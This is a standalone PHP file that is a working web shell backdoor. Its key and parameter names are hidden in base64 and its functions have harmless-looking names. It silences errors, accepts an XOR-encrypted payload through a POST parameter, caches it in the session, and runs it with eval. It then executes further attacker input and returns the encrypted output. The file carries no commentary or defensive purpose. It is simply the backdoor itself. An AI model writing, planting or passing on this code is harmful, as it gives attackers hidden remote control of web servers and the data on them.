<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function process_stream($stream, $secret){
    for($i=0; $i<strlen($stream); $i++) {
        $k_char = $secret[$i+1&15];
        $stream[$i] = $stream[$i]^$k_char;
    }
    return $stream;
}
$access_key = base64_decode('d29sZnNoZWxs');
$data_container = base64_decode('cGF5bG9hZA==');
$cipher = '3c6e0b8a9c15224a';
if (isset($_POST[$access_key])){
    $income_data = process_stream(base64_decode($_POST[$access_key]), $cipher);
    if (isset($_SESSION[$data_container])){
        $session_content = process_stream($_SESSION[$data_container], $cipher);
        if (strpos($session_content, base64_decode('Z2V0QmFzaWNzSW5mbw==')) === false){
            $session_content = process_stream($session_content, $cipher);
        }
        eval($session_content);
        echo substr(md5($access_key.$cipher), 0, 16);
        echo base64_encode(process_stream(@run($income_data), $cipher));
        echo substr(md5($access_key.$cipher), 16);
    } else {
        if (strpos($income_data, base64_decode('Z2V0QmFzaWNzSW5mbw==')) !== false){
            $_SESSION[$data_container] = process_stream($income_data, $cipher);
        }
    }
}
